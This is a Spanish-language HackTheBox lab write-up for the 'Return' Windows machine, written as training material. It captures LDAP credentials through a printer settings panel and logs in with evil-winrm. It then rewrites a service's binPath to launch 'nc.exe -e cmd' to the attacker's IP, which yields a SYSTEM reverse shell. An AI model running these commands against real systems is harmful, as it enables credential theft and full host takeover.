---
title: HTB - Return
published: true
categories: [Windows]
tags: [eJPT, OSCP, Fácil]
---


<img src="/assets/HTB/Return/return.png">


¡Hola!
Vamos a resolver de la máquina `Return` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Abusing Printer**
- **Abusing Server Operators Group**
- **Service Configuration Manipulation**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Return`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.108
PING 10.10.11.108 (10.10.11.108) 56(84) bytes of data.
64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=42.3 ms

--- 10.10.11.108 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.108 -oG allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
63704/tcp open  unknown          syn-ack ttl 127
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49678,49681,49697 10.10.11.108 -oN targeted

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-30 17:24:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Reconocimiento SMB

* * *

Utilizamos la herramienta `crackmapexec` para determinar el tipo de sistema al que nos estamos enfrentando

```bash
❯ crackmapexec smb 10.10.11.108
SMB         10.10.11.108  445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
```
Con la herramienta `smclient` tratamos de listar recursos compartidos a nivel de red haciendo uso de un NULL sesion ya que no tenemos credenciales

```bash
❯ smbclient -L 10.10.11.108 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```
Debido a que no nos arroja mucha información tratamos de manera alternatica con la herramienta `smbmap` a ver si nos reporta más información

```bash
❯ smbmap -H 10.10.11.108
[+] IP: 10.10.11.108:445	Name: 10.10.11.108
```

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.11.108
http://10.10.11.108 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.108], Microsoft-IIS[10.0], PHP[7.4.13], Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]
```
<img src="/assets/HTB/Return/adminpanel.png">

Reconociendo la web accedemos al menú de `settings` y observamos un panel para actualizar unos datos de conexión. Comprobamos si nos llega la petición poniéndonos en escucha en el puerto 389 y apuntando a nuestra dirección IP

<img src="/assets/HTB/Return/settings.png">

Nos llega la petición y obtenemos una credencial

```bash
❯ nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.108] 60410
0*`%return\svc-printer
                      1edFg43012!!
```
Con `crackmapexec` validamos la credencial obtenida

```bash
❯ crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108  445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108  445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
```
Como sabemos que el puerto 5985 (winrm) está abierto, comprobamos que con las credenciales obtenidas podamos conectarnos a este servicio

```bash
❯ crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108  5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108  5985   PRINTER          [*] http://10.10.11.108:5985/wsman
WINRM       10.10.11.108  5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```
Mediante la herramienta `evil-winrm` accedemos a la máquina víctima

```bash
❯ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

la flag de usuario la encontramos en la carpeta `Desktop` del usuario `svc-printer`

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/1/2022  12:48 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
3c5b07525a0703a5c***************
```

### Escalada Privilegios

* * *

Enumerando datos del usuario svc-printer vemos que está en el grupo `Server Operators`

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 12:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```
Una búsqueda en Google nos revela que los usuarios que pertenecen a este grupo pueden entre otras cosas arrancar y parar servicios

<img src="/assets/HTB/Return/server.png">

Primero de todo subimos la herramienta `netcat` a la máquina víctima

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> upload /home/yorch/Labs/HackTheBox/Return/content/nc.exe
Info: Uploading /home/yorch/Labs/HackTheBox/Return/content/nc.exe to C:\Users\svc-printer\Desktop\nc.exe

                                                             
Data: 37544 bytes of 37544 bytes copied

Info: Upload successful!
```
Listamos servicios que están corriendo

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
```
Si tratamos de crear un servicio nuevo no nos deja por lo que vamos a tratar de modificar uno ya existente. Probamos de uno en uno hasta que vemos que nos lo permite. Probamos WMPNetworkSvc, WinDefend y WdNisSvc sin éxito pero con VMTools nos lo permite

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config WdNisSvc binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.41 443"
[SC] OpenService FAILED 5:

Access is denied.

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.41 443"
[SC] ChangeServiceConfig SUCCESS
```
Ya sólo nos queda ponernos en escucha en el puerto 443, parar y arrancar el servicio de nuevo para obtener la reverse shell con privilegios de nt authority\system

<img src="/assets/HTB/Return/netcat.png">

La flag la encontramos en la carpeta `Desktop` del usuario administrator

```bash
C:\Users\Administrator\Desktop>type root.txt
+type root.txt
0bee5df51e1ae5eb4***************
```

Hemos completado la máquina **Return** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/Return/pwned.png">
